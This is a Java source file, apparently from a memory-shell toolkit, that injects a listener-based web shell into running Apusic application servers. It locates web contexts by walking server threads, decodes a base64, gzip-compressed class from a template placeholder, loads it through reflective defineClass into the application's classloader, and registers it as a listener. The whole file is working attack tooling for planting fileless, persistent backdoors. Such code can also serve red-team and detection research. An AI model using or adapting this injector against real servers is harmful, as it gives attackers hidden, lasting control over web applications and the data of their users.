package com.reajason.javaweb.memshell.injector.apusic;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/27
 */
public class ApusicListenerInjector {

    String msg = "";

    public ApusicListenerInjector() {
        try {
            List<Object> contexts = getContext();
            msg += "contexts size: " + contexts.size() + "\n";
            for (Object context : contexts) {
                Object shell = getShell(context);
                boolean inject = inject(context, shell);
                msg += "context: " + getFieldValue(context, "contextRoot") +(inject ? " ok" : " already") + "\n";
            }
        } catch (Throwable e) {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            PrintStream printStream = new PrintStream(outputStream);
            e.printStackTrace(printStream);
            msg += outputStream.toString();
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getName().contains("HouseKeeper")) {
                // Apusic 9.0 SPX
                Object sessionManager = getFieldValue(thread, "this$0");
                contexts.add(getFieldValue(sessionManager, "container"));
            } else if (thread.getName().contains("HTTPSession")) {
                // Apusic 9.0.1
                Object sessionManager = getFieldValue(thread, "this$0");
                Map<?, ?> contextMap = ((Map<?, ?>) getFieldValue(getFieldValue(sessionManager, "vhost"), "contexts"));
                contexts.addAll(contextMap.values());
            }
        }
        return contexts;
    }

    private Object getShell(Object context) throws Exception {
        ClassLoader loader = (ClassLoader) getFieldValue(context, "loader");
        try {
            defineShell(loader);
            Object obj = loader.loadClass(getClassName()).newInstance();
            msg += loader + " loaded \n";
            return obj;
        } catch (ClassNotFoundException e) {
            // Apusic 9.0.1
            ClassLoader internalLoader = (ClassLoader) getFieldValue(getFieldValue(loader, "delegate"), "jspLoader");
            defineShell(internalLoader);
            Object obj = loader.loadClass(getClassName()).newInstance();
            msg += internalLoader + " loaded \n";
            return obj;
        }
    }

    @SuppressWarnings("all")
    private void defineShell(ClassLoader classLoader) throws Exception {
        try {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        } catch (Throwable ignored) {
        }
    }

    public boolean inject(Object context, Object listener) throws Exception {
        Object webModule = getFieldValue(context, "webapp");
        if ((boolean) invokeMethod(webModule, "hasListener", new Class[]{String.class}, new Object[]{getClassName()})) {
            return false;
        }
        invokeMethod(webModule, "addListener", new Class[]{String.class}, new Object[]{getClassName()});
        invokeMethod(context, "loadListeners", null, null);
        return true;
    }

    @Override
    public String toString() {
        return super.toString() + "\n" + msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }

            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
